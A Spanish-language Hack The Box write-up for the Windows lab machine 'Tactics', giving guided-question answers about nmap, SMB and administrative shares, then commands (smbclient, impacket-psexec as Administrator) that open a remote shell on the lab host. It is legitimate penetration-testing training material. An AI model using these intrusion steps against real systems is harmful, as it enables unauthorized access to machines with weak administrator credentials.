---
title: Writeup tactics - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - tactics
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina tactics en Hack The Box.
keywords:
  - writeup tactics
  - hack the box tactics
  - resolución máquina tactics
  - tactics hack the box
  - htb tactics
---
--------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Windows/Tactics)
- 📺 **Resolución en vivo (completa)**: [Link]([Link](https://www.youtube.com/watch?v=6jHO8sHxz2E))
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=Nkam-8UWcpg)

-------

#veryeasy #windows #nmap #ping #impacket #smb

-------
# Guided Mode

1)¿Qué switch de Nmap podemos utilizar para enumerar máquinas cuando nuestros paquetes ICMP de ping son bloqueados por el cortafuegos de Windows?
	-Pn

2)¿Qué significa la sigla de 3 letras SMB?
	server message block

3)¿En qué puerto funciona SMB?
	445

4)¿Qué argumento de línea de comandos le das a `smbclient` para listar los recursos compartidos disponibles?
	-L

5)¿Qué carácter al final del nombre de una acción indica que se trata de una acción administrativa?
	$

6)¿Qué recurso compartido administrativo es accesible en la caja que permite a los usuarios ver todo el sistema de archivos?
	C$

7)¿Qué comando podemos utilizar para descargar los archivos que encontramos en el recurso compartido SMB?
	get

8)¿Qué herramienta de la colección Impacket puede utilizarse para obtener un shell interactivo en el sistema?
	psexec.py

---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

![[Tactics1.png]]

![[Tactics2.png]]

![[Tactics3.png]]

![[Tactics4.png]]
*TTL:* Maquina Windows
*Puertos*
	`445` [[smb]]

--------
# Intrusion a la maquina con [[impacket-psexec]]

```
smb client -L 10.129.139.81 -p 445 -U Administrator
```
Intentamos conectarnos con smb, pero nos termina rechazando la conexion asi que pasamos a intentar con [[impacket-psexec]]
![[Tactics5.png]]

```shell
impacket-psexec Administrator@10.129.139.81 -port 445
```


![[Tactics7.png]]

Una vez dentro ya podemos visualizar la flag

![[Tactics6.png]]

------
# Notas
En los OS windows el usuario con mas privilegios es Administrator y en linux root

-----
# Creditos
Writeup oficial HackTheBox